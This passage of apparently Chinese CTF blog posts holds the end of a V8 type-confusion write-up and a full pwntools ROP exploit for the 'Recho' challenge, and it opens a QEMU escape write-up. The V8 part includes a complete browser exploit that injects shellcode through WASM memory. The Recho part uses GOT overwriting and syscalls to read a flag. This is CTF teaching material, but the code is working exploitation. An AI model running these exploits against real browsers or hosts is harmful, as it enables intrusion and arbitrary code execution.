cleared.\n\n我们可以知道，字典对象的property的类型是很重要的，并且在程序中会被保存到unrecorded_dependencies容器里，而patch正是patch掉了这个操作，除了Double和SMI类型的对象，其他的对象的类型都不会被push到unrecorded_dependencies，unrecorded_dependencies最终包装给一个对象，然后返回\nreturn PropertyAccessInfo::DataConstant(    zone(), receiver_map, std::move(unrecorded_dependencies), field_index,    details_representation, field_type, field_owner_map, field_map,    holder);\n为了方便追踪，我们用gdb动态调试，设置断点，然后运行文章开始的示例脚本\nb AccessInfoFactory::ComputeDataFieldAccessInfo\n此时，unrecorded_dependencies是空的然后return到js-heap-broker.cc里的GetPropertyAccessInfo函数里接着继续最终,来到js-native-context-specialization.cc里的FilterMapsAndGetPropertyAccessInfos函数然后来到js-native-context-specialization.cc里的ReduceNamedAccess，发现这里有引用到dependencies()，打印其值，是一个容器，内容为空到这里，发现使用access_info.receiver_maps来BuildCheckMaps跟进BuildCheckMaps函数，来到property-access-builder.cc里\nvoid PropertyAccessBuilder::BuildCheckMaps(    Node* receiver, Node** effect, Node* control,    ZoneVector&lt;Handle&lt;Map&gt;&gt; const&amp; receiver_maps) &#123;  HeapObjectMatcher m(receiver);  if (m.HasValue()) &#123;    MapRef receiver_map = m.Ref(broker()).map();    if (receiver_map.is_stable()) &#123;      for (Handle&lt;Map&gt; map : receiver_maps) &#123;        if (MapRef(broker(), map).equals(receiver_map)) &#123;          dependencies()-&gt;DependOnStableMap(receiver_map);          return;        &#125;      &#125;    &#125;  &#125;.........................................................\n跟进DependOnStableMap(receiver_map);函数\n  387 void CompilationDependencies::DependOnStableMap(const MapRef&amp; map) &#123;  388   if (map.CanTransition()) &#123;► 389     RecordDependency(new (zone_) StableMapDependency(map));  390   &#125; else &#123;  391     DCHECK(map.is_stable());  392   &#125;  393 &#125;\n如果map.CanTransition()成立，就会修改property的类型继续跟踪，来到graph-reducer.cc里的GraphReducer::Reduce函数\n  85   auto skip = reducers_.end();  86   for (auto i = reducers_.begin(); i != reducers_.end();) &#123;  87     if (i != skip) &#123;  88       tick_counter_-&gt;DoTick();  89       Reduction reduction = (*i)-&gt;Reduce(node);► 90       if (!reduction.Changed()) &#123;  91         // No change from this reducer.  92       &#125; else if (reduction.replacement() == node) &#123;  93         // &#123;replacement&#125; == &#123;node&#125; represents an in-place reduction. Rerun  94         // all the other reducers for this node, as now there may be more  95         // opportunities for reduction.\npoc构造从上述的分析可知，如果DependOnStableMap(receiver_map);里的map.CanTransition()不成立，那么property的类型就不会被改变，由于const MapRef&amp; map参数来自access_info.receiver_maps()，而access_info里的部分数据来自unrecorded_dependencies，而由于patch的原因，某些类型不会加入到unrecorded_dependencies了，那么意味着一些原本该进行类型转换的操作将不会进行。首先构造\nvar obj = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;function  opt(o)&#123;    return o.a;&#125;for(var i = 0; i &lt; 0x20000; i++)&#123;    opt(obj);&#125;obj.a = 1.1;print(opt(obj));\n发现不能造成类型混淆，其JIT代码如下（部分）\n0x23565c142c38   118  49b971404c31240e0000 REX.W movq r9,0xe24314c4071    ;; object: 0x0e24314c4071 &lt;String[#1]: a&gt;0x23565c142c42   122  4151           push r90x23565c142c44   124  49b931024ab11e080000 REX.W movq r9,0x81eb14a0231    ;; object: 0x081eb14a0231 &lt;HeapNumber 1.1&gt;0x23565c142c4e   12e  4151           push r90x23565c142c50   130  48bbb00d6ce27c7f0000 REX.W movq rbx,0x7f7ce26c0db0    ;; external reference (Runtime::SetNamedProperty)0x23565c142c5a   13a  b803000000     movl rax,0x30x23565c142c5f   13f  488b75a8       REX.W movq rsi,[rbp-0x58]0x23565c142c63   143  49bac0a02fe37c7f0000 REX.W movq r10,0x7f7ce32fa0c0  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; off heap target0x23565c142c6d   14d  41ffd2         call r10\n主要是在执行obj.a = 1.1;的时候没有使用优化的方法，而是使用SetNamedProperty的普通js方法来进行赋值，那么就不会触发到漏洞点。那么，我们在&#123;&#125;里再包含一个&#123;&#125;试试\nvar obj = &#123;a:&#123;b:&quot;haivk&quot;&#125;&#125;;function  opt(o)&#123;    return o.a.b;&#125;for(var i = 0; i &lt; 0x20000; i++)&#123;    opt(obj);&#125;obj.a = &#123;b:2.2&#125;;print(opt(obj));\n仍然没有发生类型混淆，查看JIT代码\n0x3b6d7cc2dfe   19e  48b991c2313f02140000 REX.W movq rcx,0x14023f31c291    ;; object: 0x14023f31c291 &lt;String[#5]: print&gt;0x3b6d7cc2e08   1a8  48b8000000000e000000 REX.W movq rax,0xe000000000x3b6d7cc2e12   1b2  4c8bc6         REX.W movq r8,rsi0x3b6d7cc2e15   1b5  49baa0792d89ab7f0000 REX.W movq r10,0x7fab892d79a0  (LoadGlobalICTrampoline)    ;; off heap target0x3b6d7cc2e1f   1bf  41ffd2         call r10\n其中opt函数优化为如下，可以看到其被优化为了数组寻址的方法\n0x3e95ea042b5b    3b  55             push rbp0x3e95ea042b5c    3c  4889e5         REX.W movq rbp,rsp0x3e95ea042b5f    3f  56             push rsi0x3e95ea042b60    40  57             push rdi0x3e95ea042b61    41  4883ec08       REX.W subq rsp,0x80x3e95ea042b65    45  488975e8       REX.W movq [rbp-0x18],rsi0x3e95ea042b69    49  493b65e0       REX.W cmpq rsp,[r13-0x20] (external value (StackGuard::address_of_jslimit()))0x3e95ea042b6d    4d  0f8630000000   jna 0x3e95ea042ba3  &lt;+0x83&gt;0x3e95ea042b73    53  488b5510       REX.W movq rdx,[rbp+0x10]0x3e95ea042b77    57  f6c201         testb rdx,0x10x3e95ea042b7a    5a  0f8449000000   jz 0x3e95ea042bc9  &lt;+0xa9&gt;0x3e95ea042b80    60  48b9b9a6cc430b0e0000 REX.W movq rcx,0xe0b43cca6b9    ;; object: 0x0e0b43cca6b9 &lt;Map(HOLEY_ELEMENTS)&gt;0x3e95ea042b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx0x3e95ea042b8e    6e  0f8541000000   jnz 0x3e95ea042bd5  &lt;+0xb5&gt;0x3e95ea042b94    74  488b5217       REX.W movq rdx,[rdx+0x17]0x3e95ea042b98    78  488b4217       REX.W movq rax,[rdx+0x17]0x3e95ea042b9c    7c  488be5         REX.W movq rsp,rbp0x3e95ea042b9f    7f  5d             pop rbp\n考虑到是ICS缓存机制的原因，o.a.b的类型被缓存，因此存入1.1时仍然是以HOLEY_ELEMENTS的方式将1.1打包为HeapNumber，存为了对象，那么我们尝试这样修改\nvar obj = &#123;a:&#123;b:&quot;haivk&quot;&#125;&#125;;function  opt(o)&#123;    return o.a.b;&#125;for(var i = 0; i &lt; 0x20000; i++)&#123;    opt(obj);&#125;//修改点obj.a = &#123;c:2.2&#125;;print(opt(obj));\n上述，我们改了\nobj.a = &#123;c:2.2&#125;;\n即将a改成了另一个Shape形的字典对象，然后调试，可以发现，这回因为没有缓存的原因，obj.a = &#123;c:2.2&#125;;是以unboxed double的形式将数据写入而opt函数仍然能够访问obj.a.c是因为opt被优化为了数组寻址的方式，并且opt中仅比较了obj.a的类型是否合法，而没有比较obj.a.b的类型\n0x1c8800bc2b80    60  48b9b9a678b713050000 REX.W movq rcx,0x513b778a6b9    ;; object: 0x0513b778a6b9 &lt;Map(HOLEY_ELEMENTS)&gt;0x1c8800bc2b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx0x1c8800bc2b8e    6e  0f8541000000   jnz 0x1c8800bc2bd5  &lt;+0xb5&gt;0x1c8800bc2b94    74  488b5217       REX.W movq rdx,[rdx+0x17]0x1c8800bc2b98    78  488b4217       REX.W movq rax,[rdx+0x17]0x1c8800bc2b9c    7c  488be5         REX.W movq rsp,rbp0x1c8800bc2b9f    7f  5d             pop rbp\n继续运行，发现发生了类型混淆，1.1被当成一个对象地址，然后取出了一个对象由此，我们可以构造如下两个原语\nfunction addressOf(obj) &#123;   var obj1 = &#123;a:&#123;b:1.1&#125;&#125;;   let f = eval(`(obj1)=&gt;&#123;      return obj1.a.b;   &#125;`);   for (var i=0;i&lt;0x20000;i++) &#123;      f(obj1);   &#125;   obj1.a = &#123;c:obj&#125;;   var addr = f(obj1);   return u64f(addr) - 1n;&#125;function fakeObject(addr) &#123;   var obj2 = &#123;x:&#123;y:buf&#125;&#125;;   let f = eval(`(obj2)=&gt;&#123;      return obj2.x.y;   &#125;`);   for (var i=0;i&lt;0x20000;i++) &#123;      f(obj2);   &#125;   obj2.x = &#123;z:i2f64(addr + 0x1n)&#125;;   return f(obj2);&#125;\n注意事项由于ICS缓存机制的原因，上述两个原语仅能使用一次，因为调用后，里面的字典对象相关信息会被缓存，因此想要多次利用的话，需要构造多个原语函数，并且每个函数里的字典对象的key互不相同，这里，我们也可以看到，在addressOf里面，我们用的是var obj1 = &#123;a:&#123;b:1.1&#125;&#125;;，而在fakeObj里面，我们用的是var obj2 = &#123;x:&#123;y:buf&#125;&#125;;\n0x03 漏洞利用本题的v8版本为7.9.33，在低版本中，还没有compression pointer（指针压缩）机制，因此addressOf可以直接泄露出8字节地址，然后利用fakeObj伪造一个ArrayBuffer实现任意地址读写，由于没有关闭wasm，我们可以利用任意地址读写，修改wasm的shellcode，然后执行wasm就可以执行到我们的shellcode。\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;var buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;function addressOf(obj) &#123;   var obj1 = &#123;a:&#123;b:1.1&#125;&#125;;   let f = eval(`(obj1)=&gt;&#123;      return obj1.a.b;   &#125;`);   for (var i=0;i&lt;0x20000;i++) &#123;      f(obj1);   &#125;   obj1.a = &#123;c:obj&#125;;   var addr = f(obj1);   return u64f(addr) - 1n;&#125;function addressOf1(obj) &#123;   var obj1 = &#123;e:&#123;f:1.1&#125;&#125;;   let f = eval(`(obj1)=&gt;&#123;      return obj1.e.f;   &#125;`);   for (var i=0;i&lt;0x20000;i++) &#123;      f(obj1);   &#125;   obj1.e = &#123;g:obj&#125;;   var addr = f(obj1);   return u64f(addr) - 1n;&#125;function fakeObject(addr) &#123;   var obj2 = &#123;x:&#123;y:buf&#125;&#125;;   let f = eval(`(obj2)=&gt;&#123;      return obj2.x.y;   &#125;`);   for (var i=0;i&lt;0x20000;i++) &#123;      f(obj2);   &#125;   obj2.x = &#123;z:i2f64(addr + 0x1n)&#125;;   return f(obj2);&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var faker_addr = addressOf(faker);print(&#x27;faker_addr=&#x27;+faker_addr.toString(16));wasm_shellcode_ptr_addr = addressOf1(wasmInstance) + 0x80n;var element_addr = faker_addr - 0x50n;print(&#x27;element_addr=&#x27; + element_addr.toString(16));//fake a ArrayBuffer&#x27;s Mapfaker[0] = i2f64(0n);faker[1] = i2f64(0x1900042317080808n);faker[2] = i2f64(0x00000000084003ffn);faker[3] = i2f64(0);//faker a ArrayBufferfaker[4] = i2f64(element_addr+0x1n); //mapfaker[5] = i2f64(0); //propertiesfaker[6] = i2f64(0); //elementsfaker[7] = p64f(0xffffffff,0); //lengthfaker[8] = i2f64(wasm_shellcode_ptr_addr);faker[9] = 0x2;var arb_ArrayBuffer = fakeObject(element_addr+0x20n);var adv = new DataView(arb_ArrayBuffer);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));faker[8] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//%SystemBreak();//执行shellcodefunc();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n0x04 感想通过本题加深了对v8的字典对象的理解，同时学习了wasm在浏览器漏洞中的利用手法。浏览器PWN虽然难但是很有趣。\n0x05 参考Shapes and Inline Caches[译] JavaScript 引擎基础：Shapes 和 Inline CachesJavaScript engine fundamentals: optimizing prototypes简明扼要地谈谈v8的隐藏类和Inline Cache（內联缓存\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"Recho","url":"/2019/11/09/Recho/","content":"首先，还是查看一下程序的保护机制。看起来不错。\n\n\n然后用IDA分析\n\n\n看起来是一个很简单的溢出，然而，这题的难点在于这个循环如何结束。read一直都是真，如果是在linux终端上直接运行，我们可以用Ctrl+D，然而，pwn远程，就无法处理这种信号。幸运的是pwntools提供了一个shutdown功能，该功能可以关闭流，如果我们关闭输入流,这个循环就结束了。但是我们别想再次ROP到主函数获取输入，因为关闭后就不能打开，除非重新运行，那么之前的工作不都白费了吗。因此，我们必须一次性完成所有操作。\n[一次性要完成所有操作，那么暴露地址的方式肯定不能完成，幸运的是，我们可以使用系统调用(syscall)。对于有些系统,system也可以用系统调用,而对于有些系统则不行，因此，我们这里不再geshell，我们直接读取flag，然后打印出来。]{.mark}\n我们知道,open、write、read、alarm这些都是系统调用，看看IDA代码就知道\n\n\n我们希望构造这样的代码来拿到flag\nint fd = open(&quot;flag&quot;,READONLY);  read(fd,buf,100);  printf(buf);  \n由于本程序已经导入了alarm、read、write几个函数，我们现在缺的是open函数，由于open函数内部也是系统调用，只需要改变传入的eax，就可以调用open，因此，我们首先需要拿到syscall的地址或者是调用它的某处的地址。\nalarm函数我们用不到，因此，我们想把它的GOT表地址改掉，但是，如何改呢，我们发现有这么一个gadget，这是经验，赶紧记下来，这个重点\n\n\n先把两处undefine，然后再code，就变成了两条指令\n\n\n这个可以把rdi里面存地址指向处加上al，那么，[如果rdi里存储着alarm的GOT表地址，那么add [rdi],al就是把GOT表里指向的地址向后偏移al，由于alarm函数向后偏移0x5个字节处调用了syscall，]{.mark}因此，如果我们的al为0x5，那么，add指令执行后，我们的alarm函数GOT表里的地址就指向了syscall的调用处，那么我们调用alarm也就是调用syscall，我们只需在之前传入eax（系统调用号），就可以调用我们需要的系统调用\n\n\n查看libc的汇编代码，我们知道了[open的系统调用号为2]{.mark}\n\n\n因此我们就可以拼凑出一个open来\n我们还需要其他的一些指令，用来传参数，这些指令用IDA的搜索功能搜索pop就能找到，当然还有经验，\n#用于传参  &#x27;&#x27;&#x27;&#x27;&#x27;pop rax    retn&#x27;&#x27;&#x27;  pop_rax = 0x4006FC  &#x27;&#x27;&#x27;&#x27;&#x27;pop rdx    retn&#x27;&#x27;&#x27;  pop_rdx = 0x4006FE  &#x27;&#x27;&#x27;&#x27;&#x27;pop rsi    pop r15    retn&#x27;&#x27;&#x27;  pop_rsi = 0x4008A1  &#x27;&#x27;&#x27;&#x27;&#x27;pop rdi    retn&#x27;&#x27;&#x27;  pop_rdi = 0x4008A3  &#x27;&#x27;&#x27;&#x27;&#x27;add [rdi],al    retn&#x27;&#x27;&#x27;  rdi_add = 0x40070d  \n\n比如这种隐藏的，需要经验，赶紧记住了。\n\nUndefined后再向后偏移一个字节点Code，就出来了。其他类似。\n\n\n我们还需要一个存取读取结果的地方,BSS段是可以读写的\n#存储字符串  stdin_buffer = 0x601070  \n\n\n程序中也为我们准备好了”flag”字符串，指示我们使用\n\n\n那么，我们就开始构造payload吧\n我们需要先修改alarm的GOT表，改成调用syscall\npayload = &#x27;a&#x27;*0x38  #######修改alarm的GOT表内容为alarm函数里的syscall调用处地址##########  #rdi = alarm_got  payload += p64(pop_rdi) + p64(alarm_got)  #rax = 0x5  payload += p64(pop_rax) + p64(0x5)  #[rdi] = [rdi] + 0xE = alarm函数里的syscall的调用处  payload += p64(rdi_add)  ########  \n\n然后，我们先构造fd &#x3D; open(“flag”,READONLY);这句代码\n&#x27;&#x27;&#x27;&#x27;&#x27;fd = open(&#x27;flag&#x27;,READONLY)&#x27;&#x27;&#x27;  # rsi = 0 (READONLY)  payload += p64(pop_rsi) + p64(0) + p64(0)  #rdi = &#x27;flag&#x27;  payload += p64(pop_rdi) + p64(elf.search(&#x27;flag&#x27;).next())  #rax = 2,open的调用号为2，通过调试即可知道  payload += p64(pop_rax) + p64(2)  #syscall  payload += p64(alarm_plt)  \n\nopen以后，fd的值一般是3开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。如果特殊，具体看调试结果\n接下来，我们开始构造read(fd,stdin_buffer,100);这句代码\n&#x27;&#x27;&#x27;&#x27;&#x27; read(fd,stdin_buffer,100) &#x27;&#x27;&#x27;  #rdi指向buf区，用于存放读取的结果  payload += p64(pop_rsi) + p64(stdin_buffer) + p64(0)  #open()打开文件返回的文件描述符一般从3开始，依次顺序增加  payload += p64(pop_rdi) + p64(3)  # rax = 100，最多读取100个字符  payload += p64(pop_rdx) + p64(100)  #指向read函数  payload += p64(read_plt)  \n\n现在，flag的内容已经存到了std_buffer里面了，我们用printf打印它就能获得答案\n#使用printf打印读取的内容  payload += p64(pop_rdi) + p64(stdin_buffer) + p64(printf_plt) \n\n最后，我们关闭流，使循环退出，main函数到retn处，执行我们的ROP。\n#关闭输入流，就可以退出那个循环，执行ROP了  sh.shutdown(&#x27;write&#x27;)  \n\n综上，我们的exp脚本如下\n#coding:utf8  from pwn import *  import time    context.log_level = &#x27;debug&#x27;  #sh = process(&#x27;./pwnh18&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,56942)    elf = ELF(&#x27;./pwnh18&#x27;)    #用于传参  &#x27;&#x27;&#x27;&#x27;&#x27;pop rax    retn&#x27;&#x27;&#x27;  pop_rax = 0x4006FC  &#x27;&#x27;&#x27;&#x27;&#x27;pop rdx    retn&#x27;&#x27;&#x27;  pop_rdx = 0x4006FE  &#x27;&#x27;&#x27;&#x27;&#x27;pop rsi    pop r15    retn&#x27;&#x27;&#x27;  pop_rsi = 0x4008A1  &#x27;&#x27;&#x27;&#x27;&#x27;pop rdi    retn&#x27;&#x27;&#x27;  pop_rdi = 0x4008A3  &#x27;&#x27;&#x27;&#x27;&#x27;add [rdi],al    retn&#x27;&#x27;&#x27;  rdi_add = 0x40070d    #bss段的stdin缓冲区，我们可以把数据存在这里  stdin_buffer = 0x601070    alarm_got = elf.got[&#x27;alarm&#x27;]  alarm_plt = elf.plt[&#x27;alarm&#x27;]  read_plt = elf.plt[&#x27;read&#x27;]  printf_plt = elf.plt[&#x27;printf&#x27;]    sh.recvuntil(&#x27;Welcome to Recho server!\\n&#x27;)    sh.sendline(str(0x200))    payload = &#x27;a&#x27;*0x38  #######修改alarm的GOT表内容为alarm函数里的syscall调用处地址##########  #rdi = alarm_got  payload += p64(pop_rdi) + p64(alarm_got)  #rax = 0x5  payload += p64(pop_rax) + p64(0x5)  #[rdi] = [rdi] + 0xE = alarm函数里的syscall的调用处  payload += p64(rdi_add)  ########  &#x27;&#x27;&#x27;&#x27;&#x27;fd = open(&#x27;flag&#x27;,READONLY)&#x27;&#x27;&#x27;  # rsi = 0 (READONLY)  payload += p64(pop_rsi) + p64(0) + p64(0)  #rdi = &#x27;flag&#x27;  payload += p64(pop_rdi) + p64(elf.search(&#x27;flag&#x27;).next())  #rax = 2,open的调用号为2，通过调试即可知道  payload += p64(pop_rax) + p64(2)  #syscall  payload += p64(alarm_plt)  &#x27;&#x27;&#x27;&#x27;&#x27; read(fd,stdin_buffer,100) &#x27;&#x27;&#x27;  #rdi指向buf区，用于存放读取的结果  payload += p64(pop_rsi) + p64(stdin_buffer) + p64(0)  #open()打开文件返回的文件描述符一般从3开始，依次顺序增加  payload += p64(pop_rdi) + p64(3)  # rax = 100，最多读取100个字符  payload += p64(pop_rdx) + p64(100)  #指向read函数  payload += p64(read_plt)  #使用printf打印读取的内容  payload += p64(pop_rdi) + p64(stdin_buffer) + p64(printf_plt)  #这步也关键，尽量使字符串长，这样才能将我们的payload全部输进去，不然可能因为会有缓存的问题导致覆盖不完整  payload = payload.ljust(0x200,&#x27;\\x00&#x27;)    sh.sendline(payload)  #关闭输入流，就可以退出那个循环，执行ROP了  sh.shutdown(&#x27;write&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ROP","ret2syscall"]},{"title":"黑盒虚拟机逃逸RWCTF2021 Black_BOX","url":"/2022/01/28/RWCTF2021-Black-BOX/","content":"0x01 前言虚拟机逃逸，通过利用虚拟机程序本身存在的漏洞，我们可以控制虚拟机程序在宿主机上执行任意代码。虚拟机虚拟出各种设备给guest系统使用，这些虚拟设备只是虚拟机程序中的一个模块，如果这些设备存在漏洞，便可以利用起来进行逃逸。\n0x02 PCI设备结构不管是虚拟设备还是实体硬件设备，都是遵循了设备的定义规范的，PCI设备的内存布局如下注册一个设备，事实上就是将这样的内存布局初始化完成。在qemu中，硬件的初始化是从pc_init1函数开始的，并且PIC总线也是在这里开始初始化\n/* PC hardware initialisation */static void pc_init1(MachineState *machine,                     const char *host_type, const char *pci_type)&#123;    PCMachineClass *pcmc = PC_MACHINE_GET_CLASS(pcms);..........    if (pcmc-&gt;pci_enabled) &#123; //pci总线可用        PIIX3State *piix3;        pci_bus = i440fx_init(host_type,                              pci_type,                              &amp;i440fx_state,                              system_memory, system_io, machine-&gt;ram_size,                              x86ms-&gt;below_4g_mem_size,                              x86ms-&gt;above_4g_mem_size,                              pci_memory, ram_memory);        pcms-&gt;bus = pci_bus;        piix3 = piix3_create(pci_bus, &amp;isa_bus);        piix3-&gt;pic = x86ms-&gt;gsi;        piix3_devfn = piix3-&gt;dev.devfn;    &#125; else &#123; //ISA总线.........\n可见qemu使用的主板型号是i440fx，在i440fx_init函数中\nPCIBus *i440fx_init(const char *host_type, const char *pci_type,                    PCII440FXState **pi440fx_state,                    MemoryRegion *address_space_mem,                    MemoryRegion *address_space_io,                    ram_addr_t ram_size,                    ram_addr_t below_4g_mem_size,                    ram_addr_t above_4g_mem_size,                    MemoryRegion *pci_address_space,                    MemoryRegion *ram_memory)&#123;    DeviceState *dev;    PCIBus *b;    PCIDevice *d;    PCIHostState *s;    PCII440FXState *f;    unsigned i;    I440FXState *i440fx;    dev = qdev_new(host_type); //创建PIC主总线设备    s = PCI_HOST_BRIDGE(dev);    b = pci_root_bus_new(dev, NULL, pci_address_space,                         address_space_io, 0, TYPE_PCI_BUS); //创建PIC总线    s-&gt;bus = b;\n有了PIC总线以后，就可以将多种PIC设备挂到这个总线设备上了，每个PIC设备以一个模块的形式存在，qemu在启动时会根据启动参数去加载对应的模块。在qemu中，初始化函数通过调用pci_qdev_register函数将设备挂到PCI总线上。并通过module_init将初始化函数添加到设备候选列表中以供qemu启动参数选择设备。PCI设备的结构实例可以通过查看文件/sys/devices/pci0000:00/0000:XX:YY.Z/resource，其中XX为PCI总线号，YY为PCI设备号，Z为PCI功能号，每条总线最多可以挂载32个设备，每个设备最多提供8个功能。可以通过lspci -k命令来查看系统中当前的PCI设备。\n/ # lspci -k00:01.2 Class 0c03: 8086:7020 uhci_hcd00:01.0 Class 0601: 8086:700000:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:7010 ata_piix00:02.0 Class 0300: 1234:1111\n以uhci_hcd这个设备为例，其设备资源路径为/sys/devices/pci0000:00/0000:00:01.2/\n/ # ls /sys/devices/pci0000:00/0000:00:01.2/ari_enabled               enable                    rescanbroken_parity_status      irq                       resourceclass                     local_cpulist             resource4config                    local_cpus                revisionconsistent_dma_mask_bits  modalias                  subsystemd3cold_allowed            msi_bus                   subsystem_devicedevice                    numa_node                 subsystem_vendordma_mask_bits             pools                     ueventdriver                    power                     usb1driver_override           remove                    vendor\n其中的config文件对应了前面的PCI结构图\n/ # xxd  -g 1 /sys/devices/pci0000:00/0000:00:01.2/config00000000: 86 80 20 70 07 01 00 00 01 00 03 0c 00 00 00 00  .. p............00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000020: 41 c0 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11  A...............00000030: 00 00 00 00 00 00 00 00 00 00 00 00 0b 04 00 00  ................00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000060: 10 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00  ................00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000000c0: 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . ..............000000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000000e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................000000f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n从结构空间上来看，每个PCI设备最多允许6个Base Address Register，每个BAR记录了该设备映射的一段地址空间，当最后1bit为0时，代表这这映射的是IO内存当最后1bit为1时，代表这映射的是IO端口从数据中可以知道，改设备注册了一个BAR，其下标为4，类型为IO端口，并且可以看到在设备目录下存在一个resource4文件与之对应。同时，我们可以通过查看resource文件获得当前设备所有的BAR对应资源的起始地址、结束地址、flags\n/ # cat /sys/devices/pci0000:00/0000:00:01.2/resource 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x000000000000c040 0x000000000000c05f 0x0000000000040101 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000\n我们可以知道这个设备的IO端口地址为0x000000000000c040\nMMIO当一个BAR的资源类型为IO内存时，我们可以使用mmap去映射这段内存，然后就可以通过向这段内存写入或读取数据，来与设备进行交互。\nint mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:XX:YY.Z/resource0&quot;, O_RDWR | O_SYNC);if (mmio_fd == -1)    die(&quot;mmio_fd open failed&quot;); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);if (mmio_mem == MAP_FAILED)    die(&quot;mmap mmio_mem failed&quot;);\n\nPMIO当一个BAR的资源类型为IO端口时，我们需要使用指令in和out来向端口地址处读取或写入来进行交互。\nuint32_t pmio_port = 0xc040;​uint32_t pmio_write(uint32_t addr, uint32_t value)&#123;    outl(value,pmio_port+addr);&#125;​uint32_t pmio_read(uint32_t addr)&#123;    return (uint32_t)inl(pmio_port+addr);&#125;\n0x03 UHCI(Universal Host Controller Interface)UHCI是Intel主导的对USB1.0、1.1的接口标准，UHCI是比较老的标准，新的标准有EHCI对应USB2.0，XHCI对应USB3.0，每个标准都有一个对应的硬件控制器，并且属于PCI设备，在qemu中也有对应的实现。在hcd-uhci.c中，首先是将设备注册函数添加到全局设备表中\nstatic void uhci_register_types(void)&#123;    TypeInfo uhci_type_info = &#123;        .parent        = TYPE_UHCI,        .class_init    = uhci_data_class_init,    &#125;;    int i;    type_register_static(&amp;uhci_pci_type_info);    for (i = 0; i &lt; ARRAY_SIZE(uhci_info); i++) &#123;        uhci_type_info.name = uhci_info[i].name;        uhci_type_info.class_data = uhci_info + i;        type_register(&amp;uhci_type_info);    &#125;&#125;type_init(uhci_register_types)\n该设备的初始化函数为uhci_data_class_init\nvoid uhci_data_class_init(ObjectClass *klass, void *data)&#123;    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);    DeviceClass *dc = DEVICE_CLASS(klass);    UHCIPCIDeviceClass *u = container_of(k, UHCIPCIDeviceClass, parent_class);    UHCIInfo *info = data;    k-&gt;realize = info-&gt;realize ? info-&gt;realize : usb_uhci_common_realize;    k-&gt;exit = info-&gt;unplug ? usb_uhci_exit : NULL;    k-&gt;vendor_id = info-&gt;vendor_id;    k-&gt;device_id = 